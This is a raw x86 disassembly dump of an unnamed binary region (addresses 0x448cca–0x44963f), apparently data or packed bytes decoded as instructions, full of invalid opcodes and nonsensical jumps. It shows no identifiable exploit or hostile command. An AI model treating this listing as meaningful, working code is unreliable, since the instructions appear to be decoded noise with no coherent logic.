  448cca:	les    ebp,FWORD PTR [edi-0x50233328]
  448cd0:	ror    ah,1
  448cd2:	pushf  
  448cd3:	lods   eax,DWORD PTR ds:[esi]
  448cd4:	enter  0x64cc,0xad
	...
  448cf0:	add    al,al
  448cf2:	int3   
  448cf3:	fsubr  QWORD PTR [ebx-0x54433348]
  448cf9:	mov    al,0xcc
  448cfb:	mov    al,0xab
  448cfd:	test   al,0xcc
  448cff:	stos   BYTE PTR es:[edi],al
  448d00:	stos   DWORD PTR es:[edi],eax
  448d01:	mov    al,ds:0x98a9bccc
  448d06:	int3   
  448d07:	loopne 0x448cae
  448d09:	nop
  448d0a:	int3   
  448d0b:	enter  0x88a5,0xcc
  448d0f:	aam    0xa5
  448d11:	or     ah,0x28
  448d14:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  448d15:	js     0x448ce3
  448d17:	add    al,0xa6
  448d19:	jo     0x448ce7
  448d1b:	adc    BYTE PTR [esi-0x59953398],ah
  448d21:	pusha  
  448d22:	int3   
  448d23:	push   esp
  448d24:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  448d25:	pop    eax
  448d26:	int3   
  448d27:	dec    DWORD PTR [eax-0x66]
  448d2a:	leave  
  448d2b:	clc    
  448d2c:	stos   DWORD PTR es:[edi],eax
  448d2d:	cwde   
  448d2e:	leave  
  448d2f:	clc    
  448d30:	fwait
  448d31:	nop
  448d32:	leave  
  448d33:	clc    
  448d34:	mov    ecx,DWORD PTR [eax+0x607bf8c9]
  448d3a:	leave  
  448d3b:	clc    
  448d3c:	addr16 pop eax
  448d3e:	leave  
  448d3f:	clc    
  448d40:	mov    ebp,0xc5f8c94f
  448d45:	dec    edi
  448d46:	leave  
  448d47:	clc    
  448d48:	fwait
  448d49:	pop    edi
  448d4a:	leave  
  448d4b:	clc    
  448d4c:	stos   DWORD PTR es:[edi],eax
  448d4d:	pop    edi
  448d4e:	leave  
  448d4f:	clc    
  448d50:	iret   
  448d51:	dec    edi
  448d52:	leave  
  448d53:	clc    
  448d54:	add    DWORD PTR [eax],eax
	...
  448d6e:	dec    eax
  448d6f:	leave  
  448d70:	clc    
  448d71:	loope  0x448d12
  448d73:	enter  0x13f8,0x93
  448d77:	enter  0x11f8,0x9b
  448d7b:	enter  0x9f8,0x93
  448d7f:	enter  0x27f8,0x9b
  448d83:	enter  0x2bf8,0x93
  448d87:	enter  0x99f8,0x9a
  448d8b:	enter  0xbbf8,0x91
  448d8f:	enter  0xcff8,0x59
  448d93:	enter  0x93f8,0x5e
  448d97:	enter  0x91f8,0x4e
  448d9b:	enter  0x55f8,0x4e
  448d9f:	enter  0x6ff8,0x5e
  448da3:	enter  0x37f8,0x5f
  448da7:	enter  0xbf8,0x4f
  448dab:	enter  0x2ff8,0x4f
  448daf:	enter  0xd5f8,0x9e
  448db3:	enter  0xc1f8,0x9e
  448db7:	enter  0xf8,0xe3
  448dbb:	mov    eax,ds:0xa253fffb
  448dc0:	sti    
  448dc1:	(bad)  
  448dc2:	cmp    eax,0x85fffba2
  448dc7:	mov    ds:0xa28bfffb,al
  448dcc:	sti    
  448dcd:	jmp    FWORD PTR [edi]
  448dcf:	mov    ds:0xfffb,al
	...
  448de8:	add    BYTE PTR [eax],al
  448dea:	add    BYTE PTR [ecx-0x5e],cl
  448ded:	sti    
  448dee:	dec    ebx
  448df0:	mov    ds:0xa297fffb,al
  448df5:	sti    
  448df6:	jmp    DWORD PTR [ebx+0x1dfffba1]
  448dfc:	pop    es
  448dfd:	add    BYTE PTR [eax],al
  448dff:	stc    
  448e00:	jno    0x448dfd
  448e02:	call   ecx
  448e04:	jno    0x448e01
  448e06:	jmp    FWORD PTR [ecx+0x6ffffb71]
  448e0c:	jo     0x448e09
  448e0e:	inc    DWORD PTR [ecx-0x66000490]
  448e14:	jo     0x448e11
  448e16:	jmp    DWORD PTR [ebp-0x70000490]
  448e1c:	jo     0x448e19
  448e1e:	(bad)  
  448e1f:	mov    ebx,0xc5fffb70
  448e24:	jo     0x448e21
  448e26:	jmp    DWORD PTR [edi+0x59fffb72]
  448e2c:	jb     0x448e29
  448e2e:	inc    DWORD PTR [ebx+0x6dfffb72]
  448e34:	jb     0x448e31
  448e36:	jmp    DWORD PTR [edi]
  448e38:	jb     0x448e35
  448e3a:	inc    edi
  448e3c:	jno    0x448e39
  448e3e:	push   DWORD PTR [ebx]
  448e40:	jb     0x448e3d
  448e42:	dec    ecx
  448e44:	jno    0x448e41
  448e46:	call   DWORD PTR [ebp-0xb00048d]
  448e4c:	jno    0x448de5
  448e4e:	cld    
	...
  448e67:	add    BYTE PTR [ebx-0x32],ch
  448e6a:	xchg   ecx,eax
  448e6b:	cld    
  448e6c:	arpl   WORD PTR [eax-0x23a4036f],di
  448e72:	cld    
  448e73:	push   esp
  448e75:	add    al,BYTE PTR [eax+eax*1]
  448e78:	je     0x448e28
  448e7a:	cld    
  448e7b:	push   DWORD PTR [edx+ebx*2-0x71]
  448e7f:	cld    
  448e80:	cmp    ebp,DWORD PTR [edi-0x278b0004]
  448e86:	cld    
  448e87:	push   DWORD PTR [eax+edx*8-0x4]
  448e8b:	push   DWORD PTR [edx+ebx*8-0x4]
  448e8f:	push   DWORD PTR [ebp+ebp*4-0x4]
  448e93:	push   DWORD PTR [ecx+ebx*8-0x4]
  448e97:	push   DWORD PTR [eax+ebp*4-0x70]
  448e9b:	cld    
  448e9c:	add    ebx,esi
  448e9e:	nop
  448e9f:	cld    
  448ea0:	sti    
  448ea1:	in     eax,dx
  448ea2:	mov    ?,esp
  448ea4:	repz stc 
  448ea6:	mov    ?,esp
  448ea8:	jmp    0x448e93
  448eaa:	mov    ?,esp
  448eac:	jecxz  0x448eed
  448eae:	(bad)  
  448eaf:	cld    
  448eb0:	(bad)  [eax+0x4574fffc]
  448eb6:	(bad)  
  448eb7:	cld    
  448eb8:	retf   
  448eb9:	loop   0x448eb7
  448ebb:	push   DWORD PTR [edi+eax*2-0x70]
  448ebf:	cld    
  448ec0:	mov    ebx,0x74fffcd1
  448ec5:	daa    
  448ec6:	add    al,0x0
  448ec8:	je     0x448e95
  448eca:	cld    
  448ecb:	inc    DWORD PTR [eax]
	...
  448ee5:	je     0x448ec4
  448ee7:	cld    
  448ee8:	push   DWORD PTR [edx+esi*4-0x4]
  448eec:	push   DWORD PTR [ecx+ecx*1-0x71]
  448ef0:	cld    
  448ef1:	mov    ecx,DWORD PTR [ebx]
  448ef3:	add    al,0x0
  448ef5:	je     0x448efb
  448ef7:	out    0x3,al
  448ef9:	hlt    
  448efa:	test   ch,dh
  448efc:	add    esi,esp
  448efe:	test   bl,ah
  448f00:	add    esi,esp
  448f02:	test   bh,ah
  448f04:	add    esi,esp
  448f06:	test   dh,ah
  448f08:	add    esi,esp
  448f0a:	add    al,0xf3
  448f0c:	xchg   esp,eax
  448f0d:	push   eax
  448f0e:	leave  
  448f0f:	lock xchg esp,eax
  448f11:	dec    eax
  448f12:	leave  
  448f13:	pop    esi
  448f14:	xchg   esp,eax
  448f15:	inc    eax
  448f16:	leave  
  448f17:	je     0x448ead
  448f19:	cmp    cl,cl
  448f1b:	js     0x448eb1
  448f1d:	xor    cl,cl
  448f1f:	jle    0x448eb5
  448f21:	sub    cl,cl
  448f23:	xchg   esp,eax
  448f24:	xchg   esp,eax
  448f25:	and    cl,cl
  448f27:	adc    BYTE PTR [eax+ebx*1+0x109420c9],0xc9
  448f2f:	push   ss
  448f30:	xchg   esp,eax
  448f31:	or     cl,cl
  448f33:	adc    BYTE PTR [eax+eax*1-0x76bf937],dl
  448f3a:	enter  0x9408,0xf0
  448f3e:	enter  0x9412,0xe8
  448f42:	enter  0x9b74,0xe0
  448f46:	enter  0x3e6,0x0
	...
  448f62:	hlt    
  448f63:	add    al,0x8f
  448f65:	xchg   ecx,eax
  448f66:	ror    al,1
  448f68:	cwde   
  448f69:	xchg   ecx,eax
  448f6a:	enter  0xa8c8,0x91
  448f6e:	ror    al,0x12
  448f71:	xchg   esi,eax
  448f72:	mov    eax,0xb095fec8
  448f77:	enter  0x95de,0xa8
  448f7b:	enter  0x95d0,0xa0
  448f7f:	enter  0x95ca,0x98
  448f83:	enter  0x95aa,0x90
  448f87:	enter  0xe8ff,0xf7
  448f8b:	add    al,0x0
  448f8d:	mov    esi,0x1b6732f4
  448f92:	and    al,0x54
  448f94:	pop    edi
  448f95:	or     eax,0x1d695728
  448f9a:	aad    0x29
  448f9c:	je     0x448f87
  448f9e:	imul   DWORD PTR [edx-0x1]
  448fa1:	sub    edx,eax
  448fa3:	arpl   WORD PTR [edi-0xb],bx
  448fa6:	aam    0x3b
  448fa8:	jae    0x448fa7
  448faa:	aam    0x4c
  448fac:	push   ecx
  448fad:	jmp    0xbe485fa9
  448fb2:	rcr    BYTE PTR [edi+0x74],1
  448fb5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  448fb6:	sahf   
  448fb7:	push   esi
  448fb8:	dec    ebp
  448fb9:	rcr    BYTE PTR [ebp-0x513b939b],0x26
  448fc0:	data16 int3 
  448fc2:	xchg   edx,eax
  448fc3:	push   eax
  448fc4:	add    BYTE PTR [edx+0x0],bl
	...
  448fdf:	cli    
  448fe0:	inc    ebp
  448fe1:	arpl   WORD PTR [ebp-0x3da2a025],di
  448fe7:	mov    edx,0xab97735d
  448fec:	add    al,0x0
  448fee:	pushf  
  448fef:	cli    
  448ff0:	cmp    eax,0x3c5d8c70
  448ff5:	jae    0x448f8c
  448ff7:	push   esp
  448ff8:	dec    ebp
  448ff9:	push   ecx
  448ffa:	jmp    0xa64356f6
  448fff:	push   esp
  449000:	push   ecx
  449001:	dec    esp
  449002:	mov    BYTE PTR [edx],ah
  449004:	push   ecx
  449005:	inc    ebx
  449006:	jnp    0x449031
  449008:	pop    esi
  449009:	outs   dx,BYTE PTR ds:[esi]
  44900a:	jmp    0x3b415f06
  44900f:	adc    eax,0x43486359
  449014:	fs dec ebx
  449016:	push   esp
  449017:	inc    esp
  449018:	fs js  0x44901b
  44901b:	lea    eax,[ebx]
  44901d:	dec    edx
  44901e:	add    dh,bl
  449020:	pop    esp
  449021:	addr16 jae 0x44905c
  449024:	cmp    DWORD PTR [ecx+0x6e],ebx
  449027:	cmp    DWORD PTR [ebp+0x5d],ebx
  44902a:	add    BYTE PTR [edx],cl
  44902c:	add    DWORD PTR [edi],edi
  44902e:	or     DWORD PTR gs:[eax+0x67],eax
  449032:	ins    DWORD PTR es:[edi],dx
  449033:	lock popa 
  449035:	add    WORD PTR fs:[edx+0x66],bx
  44903a:	gs cli 
  44903c:	add    BYTE PTR ds:0x74661a02,bl
  449042:	dec    esi
	...
  44905b:	add    ah,bh
  44905d:	xor    al,0x61
  44905f:	jbe    0x449059
  449061:	(bad)  
  449063:	jae    0x44907e
  449065:	fs gs dec ecx
  449068:	inc    ebx
  449069:	gs addr16 add dh,ch
  44906d:	add    BYTE PTR [edi],bh
  44906f:	gs dec ecx
  449071:	pop    es
  449072:	push   0x69
  449074:	pop    ebx
  449075:	fs push esp
  449077:	jns    0x4490c6
  449079:	fs dec edi
  44907b:	add    BYTE PTR [ebx],dh
  44907d:	add    DWORD PTR [edi],edi
  44907f:	gs dec ecx
  449081:	push   cs
  449082:	jno    0x4490f7
  449084:	pop    ecx
  449085:	fs gs inc esp
  449088:	js     0x4490ee
  44908a:	pop    ecx
  44908b:	jne    0x4490fe
  44908d:	ss dec ebp
  44908f:	dec    ecx
  449090:	and    DWORD PTR [ecx+0x66],0x5f615867
  449097:	fld    QWORD PTR gs:[edx]
  44909a:	add    DWORD PTR [edx],eax
  44909c:	call   0x6163:0x424c7465
  4490a3:	arpl   WORD PTR [ebx*2+0x33447244],bp
  4490aa:	pop    ebp
  4490ab:	jae    0x4490a1
  4490ad:	(bad)  
  4490af:	dec    ebp
  4490b0:	neg    BYTE PTR [esi]
  4490b2:	pop    ecx
  4490b3:	je     0x4490f9
  4490b5:	or     ah,BYTE PTR [edi+0x5d]
  4490b8:	sbb    DWORD PTR [ebx],ecx
  4490ba:	push   ebx
  4490bb:	push   esp
  4490bc:	sbb    eax,0x6d5941
	...
  4490d9:	hlt    
  4490da:	scas   eax,DWORD PTR es:[edi]
  4490db:	add    al,BYTE PTR [ecx+0x11]
  4490de:	call   0xf11cfa23
  4490e3:	arpl   WORD PTR [bp+si+0x6804],si
  4490e8:	arpl   WORD PTR [edx-0x3c9c9f04],si
  4490ee:	(bad)  
  4490f0:	cmp    eax,0x7452f7f9
  4490f5:	(bad)  
  4490f6:	cli    
  4490f7:	pusha  
  4490f8:	jo     0x4490a5
  4490fa:	(bad)  
  4490fc:	dec    ecx
  4490fd:	icebp  
  4490fe:	scas   eax,DWORD PTR es:[edi]
  4490ff:	push   ebx
  449100:	je     0x4490a8
  449102:	mov    bh,0x59
  449104:	push   0xffffffc3
  449106:	(bad)  
  449108:	mov    edi,0x69609ef6
  44910d:	xchg   esi,eax
  44910e:	mov    esp,0xb8994b60
  449113:	outs   dx,BYTE PTR ds:[si]
  449115:	lea    ebp,[edx+0x48]
  449118:	pop    edi
  449119:	mov    BYTE PTR [eax-0x2483bcad],dl
  44911f:	cld    
  449120:	cdq    
  449121:	neg    BYTE PTR [esi+0x6b417459]
  449127:	pop    ecx
  449128:	outs   dx,BYTE PTR ds:[esi]
  449129:	cmp    BYTE PTR [ecx+0x70615f5e],al
  44912f:	dec    eax
  449130:	push   ebx
  449131:	cmp    eax,0x536a5d98
  449136:	dec    ecx
  449137:	pop    esi
  449138:	popa   
  449139:	pop    ecx
  44913a:	fdiv   st(4),st
  44913c:	leave  
	...
  449155:	add    ch,dh
  449157:	add    al,0x2a
  449159:	pop    edi
  44915a:	sub    BYTE PTR [ecx+0x50],al
  44915d:	push   ebp
  44915e:	adc    DWORD PTR [edi],edi
  449160:	push   ebp
  449161:	pop    edi
  449162:	pop    ss
  449163:	xor    dl,BYTE PTR [edi+0x63]
  449166:	cmp    DWORD PTR [eax+0x2c],esp
  449169:	pop    esp
  44916a:	and    eax,0x1fff2f05
  44916f:	push   edx
  449170:	cmp    edx,DWORD PTR [esi+0x21]
  449173:	push   ebp
  449174:	xor    BYTE PTR [ecx],dh
  449176:	hlt    
  449177:	add    al,0x4a
  449179:	add    eax,0x32135fb5
  44917e:	fstp   QWORD PTR [eax+0x1c]
  449181:	xlat   BYTE PTR ds:[bx]
  449183:	cmp    edi,ecx
  449185:	popa   
  449186:	int    0x52
  449188:	adc    al,0x63
  44918a:	enter  0xa5b,0x6a
  44918e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44918f:	add    al,0x28
  449191:	dec    edi
  449193:	push   ecx
  449194:	repz push ebp
  449196:	cdq    
  449197:	push   edi
  449198:	xlat   BYTE PTR ds:[ebx]
  449199:	inc    edx
  44919a:	hlt    
  44919b:	add    al,0xac
  44919d:	(bad)  
  44919e:	lahf   
  44919f:	push   ecx
  4491a0:	fist   DWORD PTR [ebp-0x70]
  4491a3:	pop    edi
  4491a4:	mov    ecx,0xba04f442
  4491a9:	add    eax,0x34b35fb5
  4491ae:	adc    DWORD PTR [ecx-0x45],0x5e
  4491b2:	(bad)  
  4491b3:	xor    al,al
  4491b5:	xchg   di,ax
  4491b7:	add    al,0x0
  4491b9:	add    eax,DWORD PTR [eax]
	...
  4491d3:	aaa    
  4491d4:	cmp    eax,0x37444f90
  4491d9:	and    BYTE PTR [edi+edx*2+0x38],0x96
  4491de:	add    edi,DWORD PTR [edx]
  4491e0:	push   es
  4491e1:	test   eax,0xab2a5755
  4491e6:	push   0x2a
  4491e8:	aaa    
  4491e9:	add    BYTE PTR [eax+0x68003c29],cl
  4491ef:	test   DWORD PTR [ecx],0x39194c6e
  4491f5:	arpl   WORD PTR ds:0x4a633319,sp
  4491fb:	inc    esp
  4491fc:	outs   dx,BYTE PTR cs:[esi]
  4491fe:	push   eax
  4491ff:	retf   
  449200:	add    al,0x0
  449202:	and    ah,dh
  449204:	push   ecx
  449205:	arpl   WORD PTR ds:0x47633735,si
  44920b:	and    al,0x5
  44920d:	add    dh,ch
  44920f:	not    BYTE PTR [eax+0x69]
  449212:	or     ah,dl
  449214:	push   eax
  449215:	addr16 or eax,esi
  449218:	arpl   WORD PTR [esi+0x10],bp
  44921b:	adc    eax,DWORD PTR ds:0x45f62400
  449221:	arpl   bp,di
  449223:	pop    es
  449224:	xor    ebp,DWORD PTR [ecx+0xa]
  449227:	mov    cl,0x28
  449229:	fs sti 
  44922b:	aam    0x31
  44922d:	ins    DWORD PTR es:[edi],dx
  44922e:	jmp    0xbe484b2a
  449233:	jecxz  0x449286
  449235:	inc    ecx
  449236:	les    eax,FWORD PTR [eax]
	...
  449250:	mov    ebx,0x90dd5d03
  449255:	arpl   WORD PTR ss:[edx-0x2992d16e],bp
  44925c:	fwait
  44925d:	daa    
  44925e:	dec    ebp
  44925f:	les    esp,FWORD PTR [esi-0x663998cf]
  449265:	dec    ebx
  449266:	fs jmp 0x9547da63
  44926c:	inc    esi
  44926d:	cmp    DWORD PTR [esi-0x76],ebp
  449270:	pop    esp
  449271:	xor    eax,0x77f7be67
  449276:	jmp    FWORD PTR [ecx+0x5f2845]
  44927c:	push   ecx
  44927d:	and    eax,0x254f6854
  449282:	pop    ecx
  449283:	fs int 0x7
  449286:	dec    edi
  449287:	add    ebx,DWORD PTR [eax+0x28]
  44928a:	jo     0x4492e2
  44928c:	inc    esp
  44928d:	outs   dx,DWORD PTR es:[esi]
  44928f:	dec    edi
  449290:	xor    eax,DWORD PTR [ebx]
  449292:	popa   
  449293:	ins    BYTE PTR es:[edi],dx
  449294:	xor    BYTE PTR [ecx],cl
  449296:	into   
  449297:	add    al,0xe0
  449299:	sub    ah,BYTE PTR [ebp+0x61]
  44929c:	int    0xf2
  44929e:	pusha  
  44929f:	gs ret 0x5e4b
  4492a3:	inc    esi
  4492a4:	xor    al,0x2d
  4492a6:	pop    ebp
  4492a7:	add    BYTE PTR [ebp+0x7],dh
  4492aa:	cmp    esi,DWORD PTR [edx+0x0]
  4492ad:	sub    dh,BYTE PTR [ebp+eiz*2+0x2d]
  4492b1:	push   edi
  4492b2:	arpl   WORD PTR [bx+si],ax
	...
  4492cd:	lock push edi
  4492cf:	imul   edx,DWORD PTR [edi+0x4d],0x7
  4492d3:	mov    WORD PTR [eax],es
  4492d5:	push   ds
  4492d6:	push   edi
  4492d7:	pop    ebp
  4492d8:	popa   
  4492d9:	inc    ecx
  4492da:	and    al,0x3e
  4492dc:	imul   edi,ecx,0x3d614525
  4492e2:	push   edi
  4492e3:	popa   
  4492e4:	outs   dx,BYTE PTR ds:[esi]
  4492e5:	inc    edx
  4492e6:	repnz (bad) 
  4492e8:	inc    ebp
  4492ea:	pop    es
  4492eb:	inc    esp
  4492ec:	jne    0x44932b
  4492ee:	sub    esp,DWORD PTR [ecx+0x63]
  4492f1:	sub    al,0x53
  4492f3:	pop    ebp
  4492f4:	dec    eax
  4492f5:	cmp    al,0x29
  4492f7:	fs ins BYTE PTR es:[edi],dx
  4492f9:	xor    BYTE PTR [edi],al
  4492fb:	dec    eax
  4492fc:	add    ebx,DWORD PTR [ecx+0x2a]
  4492ff:	pop    ebx
  449300:	popa   
  449301:	cmp    DWORD PTR [ecx],eax
  449303:	push   0x65
  449305:	add    BYTE PTR [esi],0xb
  449308:	add    al,0xaf
  44930a:	and    eax,0x88f4756b
  44930f:	pop    edi
  449310:	push   esp
  449311:	dec    esp
  449312:	sahf   
  449313:	pop    edi
  449314:	pop    edi
  449315:	pop    eax
  449316:	lods   al,BYTE PTR ds:[esi]
  449317:	cld    
  449318:	lock div BYTE PTR [ebp+ecx*2+0x3e]
  44931d:	push   ebp
  44931e:	nop
  44931f:	arpl   WORD PTR cs:[ebp-0x78],dx
  449323:	sub    al,0x74
  449325:	lods   al,BYTE PTR es:[esi]
  449327:	cld    
  449328:	jmp    0x6128:0x6e64f9f0
  44932f:	pop    ebp
  449330:	ins    BYTE PTR es:[edi],dx
	...
  449349:	add    BYTE PTR [edx],dh
  44934b:	pop    esi
  44934c:	pop    ecx
  44934d:	arpl   WORD PTR [ecx],di
  44934f:	inc    esp
  449350:	add    al,0xe6
  449352:	lock sbb DWORD PTR [ebp+0x6e],esp
  449356:	or     BYTE PTR [ecx],al
  449358:	pop    ebp
  449359:	ins    BYTE PTR es:[edi],dx
  44935a:	xor    eax,0xd7696800
  44935f:	lock pop ebx
  449361:	add    ah,dh
  449363:	(bad)  
  449365:	dec    ebx
  449366:	ror    DWORD PTR [eax+eiz*2],cl
  449369:	dec    esp
  44936a:	int    0xd
  44936c:	dec    esi
  44936d:	pop    edi
  44936e:	mov    BYTE PTR [edi*1-0x62e0c00],0x50
  449376:	mov    BYTE PTR [eax+edx*2],0x63
  44937a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44937b:	mov    ebp,0xde995d63
  449380:	dec    edi
  449381:	dec    ebx
  449382:	xchg   ecx,eax
  449383:	shl    BYTE PTR [ebx+0x6e],1
  449386:	popf   
  449387:	stos   DWORD PTR es:[edi],eax
  449388:	cld    
  449389:	ret    
  44938a:	cmc    
  44938b:	push   0x59
  44938d:	je     0x449346
  44938f:	or     BYTE PTR [esi+0x6e],0x91
  449393:	ror    DWORD PTR [eax+0x54],1
  449396:	mov    WORD PTR [ebp+0x59],?
  449399:	pop    edi
  44939a:	nop
  44939b:	stos   DWORD PTR es:[edi],eax
  44939c:	cld    
  44939d:	lods   eax,DWORD PTR ds:[esi]
  44939e:	clc    
  44939f:	add    al,0xb6
  4493a1:	addr16 push edi
  4493a3:	sub    BYTE PTR [edi-0x49f774fd],dl
  4493a9:	pop    esi
  4493aa:	pusha  
  4493ab:	pop    ecx
  4493ac:	jg     0x4493ff
	...
  4493c6:	add    BYTE PTR [edi+0x24],dl
  4493c9:	mov    esi,DWORD PTR [ebx]
  4493cb:	pop    edx
  4493cc:	sub    al,0x8a
  4493ce:	push   ecx
  4493cf:	pop    ebx
  4493d0:	cmp    DWORD PTR [eax+0x3],esi
  4493d3:	sub    DWORD PTR [ecx],ecx
  4493d5:	xchg   esi,eax
  4493d6:	pop    esi
  4493d7:	sub    BYTE PTR [eax+0x51],cl
  4493da:	pusha  
  4493db:	cmp    eax,0x106b212b
  4493e0:	sub    bh,ah
  4493e2:	add    edx,DWORD PTR ds:0x85f3609
  4493e8:	dec    ebx
  4493e9:	push   eax
  4493ea:	push   0x6b4a5517
  4493ef:	push   cs
  4493f0:	cmp    DWORD PTR [edx+edx*2+0x37],ecx
  4493f4:	cmp    eax,0x70c03e7
  4493f9:	sub    bl,BYTE PTR [edi-0x20]
  4493fc:	dec    edi
  4493fd:	or     ah,BYTE PTR [eax-0x19]
  449400:	xor    BYTE PTR [esp+ecx*2],cl
  449403:	mov    ebx,0xd7680332
  449408:	pop    ecx
  449409:	out    0x3,eax
  44940b:	ror    BYTE PTR [eax],cl
  44940d:	push   ss
  44940e:	pop    edi
  44940f:	enter  0x4a,0x68
  449413:	xlat   BYTE PTR ds:[ebx]
  449414:	pop    eax
  449415:	add    BYTE PTR [edi-0x69],ah
  449418:	add    al,0xc
  44941a:	inc    esp
  44941c:	ror    BYTE PTR ss:[edi-0x69],1
  449420:	dec    edx
  449421:	shl    BYTE PTR [edi-0x69],0x4
  449425:	cmp    eax,0xbb27b502
  44942a:	cmp    eax,0x0
	...
  449443:	add    BYTE PTR [ebx-0x77bd3bd0],dl
  449449:	cmp    BYTE PTR [eax],al
  44944b:	mov    ebx,0xb573628e
  449450:	push   edx
  449451:	xor    dl,BYTE PTR [ecx-0x17]
  449454:	test   esp,0x6042bafc
  44945a:	fs scas eax,DWORD PTR es:[edi]
  44945c:	dec    esi
  44945d:	xor    DWORD PTR [ebx-0x17],esp
  449460:	test   DWORD PTR [ebp+0x2425a9ff],0x4322755f
  44946a:	test   DWORD PTR [bp+si],ebx
  44946d:	push   esi
  44946e:	add    BYTE PTR [esi+0x5c6c42f6],dl
  449474:	inc    ebx
  449475:	sub    eax,0x24145042
  44947a:	ds pop esp
  44947c:	push   cs
  44947d:	and    esp,DWORD PTR [ebx+0x5b]
  449480:	sub    eax,DWORD PTR ds:0x45f1b800
  449486:	arpl   WORD PTR ds:0x4c6c282e,si
  44948c:	ret    
  44948d:	daa    
  44948e:	jbe    0x4494d4
  449490:	mov    ebp,0xfc1a003c
  449495:	push   ecx
  449496:	arpl   WORD PTR ds:0x1d6d5fb4,dx
  44949c:	lods   eax,DWORD PTR ds:[esi]
  44949d:	outs   dx,BYTE PTR cs:[esi]
  44949f:	(bad)  
  4494a0:	test   eax,0xf17b0004
  4494a5:	inc    ebp
  4494a6:	arpl   bp,si
	...
  4494c0:	add    BYTE PTR [ebp-0x3f393d9],ch
  4494c6:	daa    
  4494c7:	imul   eax,DWORD PTR [eax+edi*8],0xffffffd2
  4494cb:	jmp    FWORD PTR [esp+ebx*4-0x732a9cd0]
  4494d2:	inc    edx
  4494d3:	lds    ecx,FWORD PTR [si+0x55]
  4494d8:	cmp    eax,0x6345f9
  4494dd:	dec    ecx
  4494de:	dec    esi
  4494df:	popa   
  4494e0:	ins    BYTE PTR es:[edi],dx
  4494e1:	cmp    BYTE PTR [ecx],al
  4494e3:	data16 data16 xor bl,BYTE PTR [edx+0x65]
  4494e8:	popa   
  4494e9:	test   eax,0x9f6e6760
  4494ee:	push   eax
  4494ef:	dec    eax
  4494f0:	popa   
  4494f1:	jae    0x44951a
  4494f3:	ins    BYTE PTR es:[edi],dx
  4494f4:	gs int 0x3
  4494f7:	pop    ecx
  4494f8:	add    al,0x8e
  4494fa:	sub    al,0x74
  4494fc:	inc    esi
  4494fd:	fs pop edi
  4494ff:	pop    ebp
  449500:	inc    ecx
  449501:	dec    ecx
  449502:	pop    eax
  449503:	push   0x69
  449505:	outs   dx,DWORD PTR ds:[esi]
  449506:	pop    esp
  449507:	je     0x44956e
  449509:	cs sti 
  44950b:	(bad)  
  44950c:	(bad)  
  44950d:	mov    edi,0x446e4109
  449512:	pop    ebp
  449513:	popa   
  449514:	popa   
  449515:	xor    DWORD PTR [edx+0x72],esp
  449518:	ficom  WORD PTR gs:[esi+0x61]
  44951c:	je     0x449542
  44951e:	sub    BYTE PTR [ecx+0x6c],bl
  449521:	fisubr WORD PTR ds:0x745b
	...
  44953b:	add    BYTE PTR [eax],al
  44953d:	add    BYTE PTR [esp],dh
  449540:	data16 add BYTE PTR [esi+eax*1+0x4c],ah
  449545:	gs cld 
  449547:	pop    edx
  449548:	pop    ebp
  449549:	inc    ebx
  44954a:	jmp    DWORD PTR [ecx+0x74]
  44954d:	imul   ebp,esi,0xf8536c29
  449553:	daa    
  449554:	je     0x4495bf
  449556:	loop   0x44957a
  449558:	add    BYTE PTR [eax],al
  44955a:	jae    0x44955f
  44955c:	cmp    eax,0x6a2c396e
  449561:	inc    ebx
  449562:	das    
  449563:	pusha  
  449564:	je     0x4495cf
  449566:	sub    BYTE PTR ds:[ebx+edx*2+0x38],ch
  44956b:	es je  0x4495d7
  44956e:	hlt    
  44956f:	(bad)  
  449570:	pop    esi
  449571:	add    ah,dh
  449573:	cld    
  449574:	cld    
  449575:	inc    ebx
  449576:	xchg   ecx,eax
  449577:	fldenv [edi+0x74]
  44957a:	cdq    
  44957b:	push   0x52
  44957d:	addr16 add ah,0x61
  449581:	pop    edi
  449582:	pusha  
  449583:	fwait
  449584:	addr16 pop ebp
  449586:	pusha  
  449587:	xchg   ebp,eax
  449588:	pop    ebp
  449589:	push   0xfffffff4
  44958b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44958c:	add    eax,DWORD PTR [edx+0x4d]
  44958f:	xchg   BYTE PTR [eax+0x42],ah
  449592:	pop    ebp
  449593:	call   0x6358:0x95327451
  44959a:	sub    ebp,DWORD PTR [esp+edi*8+0x5b6df529]
  4495a1:	push   0x0
	...
  4495bb:	sbb    BYTE PTR [ebx+0x58],ch
  4495be:	imul   esp,DWORD PTR [edi],0xf5430451
  4495c4:	in     eax,0x54
  4495c6:	push   0x10
  4495c8:	out    0x60,al
  4495ca:	js     0x4495d4
  4495cc:	out    0x54,al
  4495ce:	ins    BYTE PTR es:[edi],dx
  4495cf:	adc    DWORD PTR [edi],ebx
  4495d1:	add    al,0x82
  4495d3:	mul    dh
  4495d5:	pusha  
  4495d6:	je     0x4495f8
  4495d8:	inc    esp
  4495d9:	push   edx
  4495da:	arpl   bp,dx
  4495dc:	inc    edi
  4495dd:	inc    ebx
  4495de:	imul   ebx,edx,0xe878611f
  4495e4:	stos   DWORD PTR es:[edi],eax
  4495e5:	cld    
  4495e6:	mov    ?,eax
  4495e8:	cli    
  4495e9:	pusha  
  4495ea:	je     0x449594
  4495ec:	add    edx,DWORD PTR [edx+0x63]
  4495ef:	aad    0xf
  4495f1:	inc    ebx
  4495f2:	imul   edx,edx,0xc07861b7
  4495f8:	stos   DWORD PTR es:[edi],eax
  4495f9:	cld    
  4495fa:	dec    ebx
  4495fb:	mul    dh
  4495fd:	pusha  
  4495fe:	je     0x4495c4
  449600:	add    al,0xd5
  449602:	pusha  
  449603:	shl    DWORD PTR [edi],0xd6
  449606:	push   esp
  449607:	mov    bl,0x28
  449609:	out    0x3,eax
  44960b:	push   ebx
  44960c:	or     DWORD PTR [ebx-0x2fd0659a],esi
  449612:	popa   
  449613:	mov    ds:0x8c37c438,eax
  449618:	xor    cl,ah
  44961a:	bound  ebx,QWORD PTR [eax+0x5]
  44961d:	xor    cl,BYTE PTR [eax]
	...
  449637:	add    BYTE PTR [ebp+0x24],al
  44963a:	nop
  44963b:	push   edi
  44963c:	ss cs xchg ebp,eax
  44963f:	xor    DWORD PTR ds:[bp+di+0x445a],ebx
